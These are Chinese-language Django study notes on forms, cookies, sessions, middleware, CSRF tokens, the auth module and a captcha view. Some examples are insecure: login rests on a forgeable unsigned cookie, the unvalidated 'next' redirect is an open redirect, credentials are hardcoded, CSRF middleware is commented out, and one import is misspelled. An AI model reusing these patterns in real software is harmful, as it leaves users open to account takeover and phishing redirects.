        password = self.cleaned_data.get('password')
        confirm_password = self.cleaned_data.get('confirm_password')
        if not confirm_password == password:
            self.add_error('confirm_password','两次密码不一致')
        # 将钩子函数钩出来数据再放回去
        return self.cleaned_data
```

#### forms组件其他参数及补充知识点

```python
label		字段名
error_messages  自定义报错信息
initial  默认值
required  控制字段是否必填
"""
1.字段没有样式
2.针对不同类型的input如何修改
	text
	password
	date
	radio
	checkbox
	...
"""
widget=forms.widgets.PasswordInput(attrs={'class':'form-control c1 c2'})
# 多个属性值的话 直接空格隔开即可

# 第一道关卡里面还支持正则校验
validators=[
            RegexValidator(r'^[0-9]+$', '请输入数字'),
            RegexValidator(r'^159[0-9]+$', '数字必须以159开头')
        ]
```

其他类型渲染

```python
# radio
    gender = forms.ChoiceField(
        choices=((1, "男"), (2, "女"), (3, "保密")),
        label="性别",
        initial=3,
        widget=forms.widgets.RadioSelect()
    )
    # select
    hobby = forms.ChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=3,
        widget=forms.widgets.Select()
    )
    # 多选
    hobby1 = forms.MultipleChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=[1, 3],
        widget=forms.widgets.SelectMultiple()
    )
    # 单选checkbox
    keep = forms.ChoiceField(
        label="是否记住密码",
        initial="checked",
        widget=forms.widgets.CheckboxInput()
    )
    # 多选checkbox
    hobby2 = forms.MultipleChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=[1, 3],
        widget=forms.widgets.CheckboxSelectMultiple()
    )
```



#### django操作Cookie

urls.py

~~~python
    re_path(r'^home/', views.home),
    re_path(r'^login/',views.login),
~~~

views.py

~~~python
"""
设置cookie
	obj.set_cookie(key,value)
获取cookie
	request.COOKIES.get(key)
在设置cookie的时候可以添加一个超时时间
	obj.set_cookie('username', 'jason666',max_age=3,expires=3)
	
	max_age
	expires
		两者都是设置超时时间的 并且都是以秒为单位
		需要注意的是 针对IE浏览器需要使用expires
主动删除cookie(注销功能)
	
	
"""
# 我们完成一个真正的登陆功能
# 校验用户是否登陆的装饰器
"""
用户如果在没有登陆的情况下想访问一个需要登陆的页面
那么先跳转到登陆页面 当用户输入正确的用户名和密码之后
应该跳转到用户之前想要访问的页面去 而不是直接写死
"""
def login_auth(func):
    def inner(request,*args,**kwargs):
        # print(request.path_info)
        # print(request.get_full_path())  # 能够获取到用户上一次想要访问的url
        target_url = request.get_full_path()
        if request.COOKIES.get('username'):
            return func(request,*args,**kwargs)
        else:
            return redirect('/login/?next=%s'%target_url)
    return inner

def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if username == 'jason' and password == '123':

            # 获取用户上一次想要访问的url
            target_url = request.GET.get('next')  # 这个结果可能是None
            if target_url:
                obj = redirect(target_url)
            else:
                # 保存用户登陆状态
                obj = redirect('/home/')
            # 让浏览器记录cookie数据
            obj.set_cookie('username', 'jason666')
            """
            浏览器不单单会帮你存
            而且后面每次访问你的时候还会带着它过来
            """
            # 跳转到一个需要用户登陆之后才能看的页面
            return obj
    return render(request,'login.html')


@login_auth
def home(request):
    # 获取cookie信息 判断你有没有
    # if request.COOKIES.get('username') == 'jason666':
    #     return HttpResponse("我是home页面，只有登陆的用户才能进来哟~")
    # # 没有登陆应该跳转到登陆页面
    # return redirect('/login/')
    return HttpResponse("我是home页面，只有登陆的用户才能进来哟~")
~~~

[![p9ry0mR.png](https://s1.ax1x.com/2023/05/11/p9ry0mR.png)](https://imgse.com/i/p9ry0mR)

#### session操作

~~~python
"""
session数据是保存在服务端的(存？)，给客户端返回的是一个随机字符串
	sessionid:随机字符串
	
1.在默认情况下操作session的时候需要django默认的一张django_session表
	数据库迁移命令
		django会自己创建很多表	django_session就是其中的一张
		

django默认session的过期时间是14天
	但是你也可以人为的修改它
	

设置session	
request.session['key'] = value

获取session
request.session.get('key')

设置过期时间
request.session.set_expiry()
	括号内可以放四种类型的参数
		1.整数						多少秒
		2.日期对象			   到指定日期就失效
		3.0								一旦当前浏览器窗口关闭立刻失效
		4.不写						失效时间就取决于django内部全局session默认的失效时间

清除session	
	request.session.delete()  # 只删服务端的 客户端的不删
	request.session.flush()  # 浏览器和服务端都清空(推荐使用)


session是保存在服务端的 但是session的保存位置可以有多种选择
	1.MySQL
	2.文件
	3.redis
	4.memcache
	...
	

django_session表中的数据条数是取决于浏览器的
	同一个计算机上(IP地址)同一个浏览器只会有一条数据生效
	(当session过期的时候可能会出现多条数据对应一个浏览器，但是该现象不会持续很久，内部会自动识别过期的数据清除 你也可以通过代码清除)
	
	主要是为了节省服务端数据库资源
"""

request.session['hobby'] = 'girl'
    """
    内部发送了那些事
        1.django内部会自动帮你生成一个随机字符串
        2.django内部自动将随机字符串和对应的数据存储到django_session表中
            2.1先在内存中产生操作数据的缓存
            2.2在响应结果django中间件的时候才真正的操作数据库
        3.将产生的随机字符串返回给客户端浏览器保存
    """
request.session.get('hobby')
    """
    内部发送了那些事
        1.自动从浏览器请求中获取sessionid对应的随机字符串
        2.拿着该随机字符串去django_session表中查找对应的数据
        3.
            如果比对上了 则将对应的数据取出并以字典的形式封装到request.session中
            如果比对不上 则request.session.get()返回的是None
    """
  
  
# 利用session实现登陆验证

~~~

#### CBV如何添加装饰器

~~~python
from django.views import View
from django.utils.decorators import method_decorator
"""
CBV中django不建议你直接给类的方法加装饰器
无论该装饰器能都正常给你 都不建议直接加
"""

# @method_decorator(login_auth,name='get')  # 方式2(可以添加多个针对不同的方法加不同的装饰器)
# @method_decorator(login_auth,name='post')
class MyLogin(View):
    @method_decorator(login_auth)  # 方式3:它会直接作用于当前类里面的所有的方法
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request,*args,**kwargs)
    # @method_decorator(login_auth)  # 方式1:指名道姓
    def get(self,request):
        return HttpResponse("get请求")

    def post(self,request):
        return HttpResponse('post请求')
~~~

#### django中间件

~~~python
"""
django中间件是django的门户
1.请求来的时候需要先经过中间件才能到达真正的django后端
2.响应走的时候最后也需要经过中间件才能发送出去

django自带七个中间件
"""
django请求生命周期流程图

研究django中间件代码规律
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

class SessionMiddleware(MiddlewareMixin):
    def process_request(self, request):
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME)
        request.session = self.SessionStore(session_key)
    def process_response(self, request, response):
        return response
      
class CsrfViewMiddleware(MiddlewareMixin):
  	def process_request(self, request):
        csrf_token = self._get_token(request)
        if csrf_token is not None:
            # Use same token next time.
            request.META['CSRF_COOKIE'] = csrf_token
    def process_view(self, request, callback, callback_args, callback_kwargs):
        return self._accept(request)

    def process_response(self, request, response):
        return response
      
class AuthenticationMiddleware(MiddlewareMixin):
    def process_request(self, request):
        request.user = SimpleLazyObject(lambda: get_user(request))
"""
django支持程序员自定义中间件并且暴露给程序员五个可以自定义的方法
	1.必须掌握
		process_request
		
		process_response
	2.了解即可
		process_view
			
		process_template_response
		
		process_exception
"""
~~~

#### 定义自己的中间件

~~~python
"""
1.在项目名或者应用名下创建一个任意名称的文件夹
2.在该文件夹内创建一个任意名称的py文件
3.在该py文件内需要书写类(这个类必须继承MiddlewareMixin)
	然后在这个类里面就可以自定义五个方法了
	(这五个方法并不是全部都需要书写，用几个写几个)
4.需要将类的路径以字符串的形式注册到配置文件中才能生效
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    '你自己写的中间件的路径1',
    '你自己写的中间件的路径2',
    '你自己写的中间件的路径3',
]

"""
"""
1.必须掌握
		process_request 
			1.请求来的时候需要经过每一个中间件里面的process_request方法
			结果的顺序是按照配置文件中注册的中间件从上往下的顺序依次执行
			2.如果中间件里面没有定义该方法，那么直接跳过执行下一个中间件
			3.如果该方法返回了HttpResponse对象，那么请求将不再继续往后执行
			而是直接原路返回(校验失败不允许访问...)
			process_request方法就是用来做全局相关的所有限制功能
			
		process_response
			1.响应走的时候需要结果每一个中间件里面的process_response方法
			该方法有两个额外的参数request,response
			2.该方法必须返回一个HttpResponse对象
				1.默认返回的就是形参response
				2.你也可以自己返回自己的
			3.顺序是按照配置文件中注册了的中间件从下往上依次经过
				如果你没有定义的话 直接跳过执行下一个
		
		研究如果在第一个process_request方法就已经返回了HttpResponse对象，那么响应走的时候是经过所有的中间件里面的process_response还是有其他情况
		是其他情况
			就是会直接走同级别的process_reponse返回
		
		flask框架也有一个中间件但是它的规律
			只要返回数据了就必须经过所有中间件里面的类似于process_reponse方法
			
			
2.了解即可
		process_view
			路由匹配成功之后执行视图函数之前，会自动执行中间件里面的该放法
			顺序是按照配置文件中注册的中间件从上往下的顺序依次执行
			
		process_template_response
			返回的HttpResponse对象有render属性的时候才会触发
			顺序是按照配置文件中注册了的中间件从下往上依次经过
			
		process_exception
			当视图函数中出现异常的情况下触发
			顺序是按照配置文件中注册了的中间件从下往上依次经过
"""
	
~~~

~~~python
from django.utils.depreacation import MiddlewareMixin

class MyMiddleware(MiddlewareMixin):
    def process_request(self,request):
        print('我是第一个自定义中间件里面的process_request方法')
        # return HttpResponse('baby!')

    def process_response(self,request,response):
        """
        :param request:
        :param response: 就是django后端返回给浏览器的内容
        :return:
        """
        print('我是第一个自定义中间件里面的process_response方法')
        return response

    def process_view(self,request,view_name,*args,**kwargs):
        print(view_name,args,kwargs)
        print('我是第一个自定义中间件里面的process_view')

    def process_template_response(self,request,response):
        print('我是第一个自定义中间件里面的process_template_response')
        return response

    def process_exception(self,request,exception):
        print('我是第一个中间件里面的process_exception')
        print(exception)
        

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    #   注册自己的中间件
    'app01.mymiddleware.mydd.MyMiddleware'
]
~~~

#### CSRF设置token

访问url

[![p9rg3TI.png](https://s1.ax1x.com/2023/05/11/p9rg3TI.png)](https://imgse.com/i/p9rg3TI)

[![p9rg10A.png](https://s1.ax1x.com/2023/05/11/p9rg10A.png)](https://imgse.com/i/p9rg10A)



~~~html
<script>
    $('#d1').click(function () {
        $.ajax({
            url:'',
            type:'post',
            // 第一种 利用标签查找获取页面上的随机字符串
            {#data:{"username":'jason','csrfmiddlewaretoken':$('[name=csrfmiddlewaretoken]').val()},#}
            // 第二种 利用模版语法提供的快捷书写
            {#data:{"username":'jason','csrfmiddlewaretoken':'{[ csrf_token ]}'},#}
            // 第三种 通用方式直接拷贝js代码并应用到自己的html页面上即可
            data:{"username":'jason'},
            success:function () {

            }
        })
    })
</script>
~~~

~~~python
# ajax如何符合校验
// 第一种 利用标签查找获取页面上的随机字符串
{#data:{"username":'jason','csrfmiddlewaretoken':$('[name=csrfmiddlewaretoken]').val()},#}
// 第二种 利用模版语法提供的快捷书写
{#data:{"username":'jason','csrfmiddlewaretoken':'{[ csrf_token ]}'},#}
// 第三种 通用方式直接拷贝js代码并应用到自己的html页面上即可
data:{"username":'jason'}
~~~

~~~js
function getCookie(name) {
    var cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
            var cookie = jQuery.trim(cookies[i]);
            // Does this cookie string begin with the name we want?
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}
var csrftoken = getCookie('csrftoken');


function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}

$.ajaxSetup({
  beforeSend: function (xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader("X-CSRFToken", csrftoken);
    }
  }
});
~~~

#### Auth模块

~~~python
"""
其实我们在创建好一个django项目之后直接执行数据库迁移命令会自动生成很多表
	django_session
	auth_user
django在启动之后就可以直接访问admin路由，需要输入用户名和密码，数据参考的就是auth_user表,并且还必须是管理员用户才能进入

创建超级用户(管理员)
	python manage.py createsuperuser
	
依赖于auth_user表完成用户相关的所有功能
"""
sha256
~~~

[![p9rWD7d.png](https://s1.ax1x.com/2023/05/11/p9rWD7d.png)](https://imgse.com/i/p9rWD7d)

~~~python
# 1.比对用户名和密码是否正确
user_obj = auth.authenticate(request,username=username,password=password)
# 括号内必须同时传入用户名和密码
print(user_obj)  # 用户对象  jason   数据不符合则返回None
print(user_obj.username)  # jason
print(user_obj.password)  # 密文

# 2.保存用户状态
auth.login(request,user_obj)  # 类似于request.session[key] = user_obj
# 主要执行了该方法 你就可以在任何地方通过request.user获取到当前登陆的用户对象

# 3.判断当前用户是否登陆
request.user.is_authenticated()

# 4.获取当前登陆用户
request.user

# 5.校验用户是否登陆装饰器
from django.contrib.auth.decorators import login_required
# 局部配置
@login_required(login_url='/login/') 
# 全局配置
LOGIN_URL = '/login/'
	1.如果局部和全局都有 该听谁的?
    局部 > 全局
	2.局部和全局哪个好呢?
    全局的好处在于无需重复写代码 但是跳转的页面却很单一
    局部的好处在于不同的视图函数在用户没有登陆的情况下可以跳转到不同的页面

# 6.比对原密码
request.user.check_password(old_password)

# 7.修改密码
request.user.set_password(new_password)  # 仅仅是在修改对象的属性
request.user.save()  # 这一步才是真正的操作数据库

# 8.注销
auth.logout(request) 

# 9.注册
# 操作auth_user表写入数据
User.objects.create(username=username,password=password)  # 写入数据  不能用create 密码没有加密处理
# 创建普通用户
User.objects.create_user(username=username,password=password)
# 创建超级用户(了解):使用代码创建超级用户 邮箱是必填的 而用命令创建则可以不填
User.objects.create_superuser(username=username,email='123@qq.com',password=password)
~~~



#### 表设计

~~~
~~~





#### 验证码功能

~~~python
def login(request):
    if request.method == 'POST':
        back_dic = {'code':1000,'msg':''}
        username = request.POST.get('username')
        password = request.POST.get('password')
        code = request.POST.get('code')
        # 1 先校验验证码是否正确      自己决定是否忽略            统一转大写或者小写再比较
        if request.session.get('code').upper() == code.upper():
            # 2 校验用户名和密码是否正确
            user_obj = auth.authenticate(request,username=username,password=password)
            if user_obj:
                # 保存用户状态
                auth.login(request,user_obj)
                back_dic['url'] = '/home/'
            else:
                back_dic['code'] = 2000
                back_dic['msg'] = '用户名或密码错误'
        else:
            back_dic['code'] = 3000
            back_dic['msg'] = '验证码错误'
        return JsonResponse(back_dic)
    return render(request,'login.html')

"""
图片相关的模块
    pip3 install pillow
"""
from PIL import Image,ImageDraw,ImageFont
"""
Image:生成图片
ImageDraw:能够在图片上乱涂乱画
ImageFont:控制字体样式
"""
from io import BytesIO,StringIO
"""
内存管理器模块
BytesIO:临时帮你存储数据 返回的时候数据是二进制
StringIO:临时帮你存储数据 返回的时候数据是字符串
"""
import random
def get_random():
    return random.randint(0,255),random.randint(0,255),random.randint(0,255)
def get_code(request):
    # 推导步骤1:直接获取后端现成的图片二进制数据发送给前端
    # with open(r'static/img/111.jpg','rb') as f:
    #     data = f.read()
    # return HttpResponse(data)

    # 推导步骤2:利用pillow模块动态产生图片
    # img_obj = Image.new('RGB',(430,35),'green')
    # img_obj = Image.new('RGB',(430,35),get_random())
    # # 先将图片对象保存起来
    # with open('xxx.png','wb') as f:
    #     img_obj.save(f,'png')
    # # 再将图片对象读取出来
    # with open('xxx.png','rb') as f:
    #     data = f.read()
    # return HttpResponse(data)

    # 推导步骤3:文件存储繁琐IO操作效率低  借助于内存管理器模块
    # img_obj = Image.new('RGB', (430, 35), get_random())
    # io_obj = BytesIO()  # 生成一个内存管理器对象  你可以看成是文件句柄
    # img_obj.save(io_obj,'png')
    # return HttpResponse(io_obj.getvalue())  # 从内存管理器中读取二进制的图片数据返回给前端


    # 最终步骤4:写图片验证码
    img_obj = Image.new('RGB', (430, 35), get_random())
    img_draw = ImageDraw.Draw(img_obj)  # 产生一个画笔对象
    img_font = ImageFont.truetype('static/font/222.ttf',30)  # 字体样式 大小

    # 随机验证码  五位数的随机验证码  数字 小写字母 大写字母
    code = ''
    for i in range(5):
        random_upper = chr(random.randint(65,90))
        random_lower = chr(random.randint(97,122))
        random_int = str(random.randint(0,9))
        # 从上面三个里面随机选择一个
        tmp = random.choice([random_lower,random_upper,random_int])
        # 将产生的随机字符串写入到图片上
        """
        为什么一个个写而不是生成好了之后再写
        因为一个个写能够控制每个字体的间隙 而生成好之后再写的话
        间隙就没法控制了
        """
        img_draw.text((i*60+60,-2),tmp,get_random(),img_font)
        # 拼接随机字符串
        code += tmp
    print(code)
    # 随机验证码在登陆的视图函数里面需要用到 要比对 所以要找地方存起来并且其他视图函数也能拿到
    request.session['code'] = code
    io_obj = BytesIO()
    img_obj.save(io_obj,'png')
    return HttpResponse(io_obj.getvalue())
~~~



















